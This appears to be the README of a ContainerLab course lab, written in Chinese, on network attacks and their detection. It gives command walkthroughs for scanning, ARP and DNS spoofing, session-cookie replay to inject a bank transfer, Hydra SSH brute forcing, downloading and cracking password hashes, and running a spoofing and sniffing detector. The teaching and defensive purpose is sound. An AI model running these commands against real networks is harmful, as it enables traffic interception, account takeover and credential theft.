# 实验一：网络攻击与攻击检测

这是一套用于网络攻击与攻击检测教学的 ContainerLab 本地靶场。
目录和 ContainerLab 拓扑内部名称统一为 `network-ad`。

## 目录结构

| 路径 | 用途 |
|---|---|
| `nodes/common/configs/` | 所有节点共用的数据接口等待和运行辅助函数 |
| `nodes/<node>/configs/` | 对应节点启动后执行的服务初始化脚本 |
| `nodes/attacker/tools/` | ARP、DNS 和会话攻击脚本 |
| `nodes/attacker/wordlists/` | Hydra 与 John 使用的字典 |
| `scripts/` | WSL 主机侧部署、验证、抓包和清理脚本 |
| `setup/` | WSL、Docker、ContainerLab 的安装与预检脚本 |
| `captures/` | 主机与容器共享的 pcap 产物 |
| `clab-network-ad/` | ContainerLab 自动生成的运行状态目录，不应手工维护 |

`configs` 不是镜像构建上下文，也不会改动节点 Dockerfile。它通过只读 bind mount 挂载到
容器内，在实验网接口就绪后执行，负责初始化 SSH、HTTP、DNS、流量生成、检测器和随机 flag。

## 前置条件

- WSL2 中的 Kali Linux 环境
- Docker Engine 或 Docker Desktop 的 WSL 集成
- ContainerLab v0.82.0
- 至少 4 GiB 可用内存，推荐 8 GiB

首次使用时，在 `network-ad` 目录执行：

```bash
bash setup/setup-wsl.sh
bash setup/preflight.sh
```

## 拓扑

所有实验节点位于同一个二层网段 `10.30.50.0/24`，不需要第二套网络。
攻击机的 `eth0` 是 Containerlab 管理网络，`eth1` 才是课程实验网络。扫描、抓包和攻击
都应使用 `10.30.50.99` 所在的接口。

| 节点 | IP | 角色 |
|---|---:|---|
| `target` | 10.30.50.10 | HTTP/HTTPS/SSH 服务，提供登录、转账、敏感文件 |
| `victim` | 10.30.50.21 | 受害者主机，周期产生 HTTP、HTTPS、DNS、ICMP 流量 |
| `dns` | 10.30.50.53 | 内网 DNS，解析 `app.intranet.lab` |
| `gateway` | 10.30.50.254 | 网关和转发节点 |
| `attacker` | 10.30.50.99 | Kali 工具环境 |

## 快速开始

```bash
# 进入实验目录
cd network-ad

# 首次使用或需要重建时构建五个节点镜像
bash scripts/build-images.sh

# 直接部署 ContainerLab 拓扑
containerlab deploy -t topology.clab.yml

# 检查节点、服务和攻击工具
bash scripts/verify.sh smoke
```

进入攻击机：

```bash
# 进入攻击者容器
docker exec -it clab-network-ad-attacker /bin/bash
```

攻击机内先查看网卡和 IPv4 地址，确认 `10.30.50.99` 位于哪个接口：

```bash
# 显示接口名称、状态和 IPv4 地址
ip -o -4 addr show
```

本机当前布局通常如下，后续命令直接使用 `eth1`：

```text
eth0  172.30.50.99/24  Containerlab 管理网络，不用于课程实验
eth1  10.30.50.99/24   课程实验网络，扫描和攻击使用此接口
```

## 网络攻击技术实验

### Nmap 与 Wireshark

按“主机发现 → RustScan 端口发现 → Nmap 服务识别”的顺序扫描。不要直接对 `/24`
执行全端口 `-sV`，否则大量无响应地址会让扫描看起来像卡住。

```bash
# 1. 确认课程实验网络位于 eth1（输出中应包含 10.30.50.99）
ip -o -4 addr show

# 2A. 使用 ARP 发现同一网段的在线主机
arp-scan --interface=eth1 --localnet

# 2B. 或者使用 Nmap 做主机发现（与 2A 任选一个）
nmap -sn 10.30.50.0/24

# 3. 对已经发现的目标做快速端口扫描；-g 只输出端口，不自动调用 Nmap
rustscan -a 10.30.50.10 -g --ulimit 5000

# 4. 对 RustScan 发现的端口做服务识别；--host-timeout 防止长时间卡住
nmap -sV -Pn -T4 --version-light --max-retries 1 --host-timeout 30s \
  -p 22,80,443 10.30.50.10

# 5. 探测目标操作系统；--osscan-guess 在虚拟机环境中输出最接近的匹配
nmap -O -Pn --osscan-guess --max-os-tries 2 10.30.50.10
```

抓取受害者流量：

```bash
# 回到 WSL 主机的实验目录；如需先退出攻击机，请先输入 exit
cd network-ad

# 抓取 90 秒流量；脚本会暂时启用 ARP 中间人，以捕获 victim 的单播业务流量
bash scripts/capture.sh network 90

# 仅观察广播报文，不启用 ARP 中间人
CAPTURE_MITM=0 bash scripts/capture.sh arp-only 30
```

pcap 保存在宿主机 `captures/network-*.pcap`，可直接用 Windows 的 Wireshark 打开。
文件包含 ICMP 成功/失败、TCP 三次握手、HTTP 明文登录和 TLS 握手。

也可以先用 tshark 检查 pcap 中的协议组成和握手过程：

```bash
# 在 WSL 主机执行，并确保当前目录是 network-ad
# 分析最近一次 network 抓包，输出协议统计和关键握手报文
bash scripts/analyze-pcap.sh

# 分析指定的 pcap 文件
bash scripts/analyze-pcap.sh captures/network-20261102-105544.pcap
```

### ARP 欺骗

```bash
# 使用 eth1 对 victim 和 target 发起 ARP 欺骗；工具会自动解析受害者 MAC
python3 /opt/tools/arp_spoof.py -i eth1 \
  --victim 10.30.50.21 \
  --spoof 10.30.50.254 --spoof 10.30.50.10
```

另开终端抓包，可以看到受害者与其他主机的单播通信。

### DNS 欺骗

该脚本会继续对受害者的 DNS 服务器做 ARP 欺骗，并伪造 `app.intranet.lab` 的应答：

```bash
# 使用 eth1 发起 ARP 欺骗并伪造 app.intranet.lab 的 DNS 应答；受害者 MAC 自动解析
python3 /opt/tools/dns_spoof.py -i eth1 \
  --victim 10.30.50.21
```

等待受害者下一次轮询后，脚本输出 `FLAG_DNS=...`。

### 会话劫持和请求注入

```bash
# 从抓包中提取会话 Cookie 并注入一次转账请求
python3 /opt/tools/replay_session.py
```

工具会从 pcap 或实时流量中提取会话 Cookie，再注入一次高金额转账请求并打印
`FLAG_INJECT=...`。

## 攻击检测技术实验

先保持 ARP/DNS 攻击运行，或启动任意混杂模式抓包。然后在受害机上运行：

```bash
# 进入受害者容器
docker exec -it clab-network-ad-victim /bin/bash

# 查看受害者容器的接口，确认 10.30.50.21 位于 eth1
ip -o -4 addr show

# 在课程实验接口上启动抓包和 ARP 欺骗检测器
sniff-detector -i eth1

# 仅执行混杂模式嗅探检测
sniff-detector -i eth1 -p

# 仅执行 ARP 欺骗检测
sniff-detector -i eth1 -a
```

检测器会报告：

- IP→MAC 翻转；
- 同一 MAC 声称多个 IP；
- 响应错误目标 MAC 探测包的主机，即混杂模式候选。

### 口令与哈希

```bash
# 使用弱口令字典测试 victim 的 SSH 登录口令
hydra -l alice -P /opt/wordlists/weak.txt ssh://10.30.50.21

# 使用爆破出的口令登录 victim，并读取本次部署随机生成的证明 flag
sshpass -p victim123 ssh -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null alice@10.30.50.21 'printenv FLAG_SSH'

# 下载 target 暴露的密码哈希文件
curl -s http://10.30.50.10/loot/hashes.txt -o /tmp/hashes.txt

# 使用弱口令字典离线破解哈希
john --wordlist=/opt/wordlists/weak.txt /tmp/hashes.txt
```

### 漏洞扫描

```bash
# 使用 Nikto 扫描 target 的 Web 漏洞
nikto -h http://10.30.50.10 -nointeractive

# 仍在攻击者容器中，直接使用 masscan 对已发现主机做高速端口扫描
bash /opt/tools/masscan-scan.sh 10.30.50.10 22,80,443
```

如需从 WSL 主机直接启动，可执行：

```bash
docker exec clab-network-ad-attacker \
  bash /opt/tools/masscan-scan.sh 10.30.50.10 22,80,443
```

实际 masscan 进程仍在攻击机容器中运行。

课程点名但无法稳定容器化的工具按以下方式替代：

| 课程工具 | 本环境方案 |
|---|---|
| Zenmap | Nmap 命令行（与 Zenmap 使用同一个扫描引擎） |
| Wireshark GUI | `tshark`/`tcpdump` 生成 pcap，Windows Wireshark 打开 |
| Nessus、fscan、XRay | Nikto 漏洞扫描 + masscan 端口发现 |
| 超级弱口令检查工具 | Hydra + `nodes/attacker/wordlists/weak.txt` |
| CMD5 在线站点、Hashcat | John the Ripper 离线验证 |
| ARPSpoof、Netwox | 自实现 Scapy `arp_spoof.py` |
| arp-scan、arping | `arp-scan` + `ip neigh` |
| Ettercap、Bettercap | 自实现 Scapy 场景 + Wireshark 验证 |
| ARPdetect、ArpKiller、Promiscdetect | 自实现 C 工具 `sniff-detector` |
| ferret-sidejack、Hamster-sidejack | `replay_session.py` + `tshark` |

## 验证

```bash
# 快速检查节点、服务和攻击工具
bash scripts/verify.sh smoke

# 完整验证攻击、破解和检测流程
bash scripts/verify.sh full
```

完整验证需要约 2–4 分钟。所有 flag 在每次部署时随机生成。

停止并删除实验环境：

```bash
containerlab destroy -t topology.clab.yml --cleanup
```
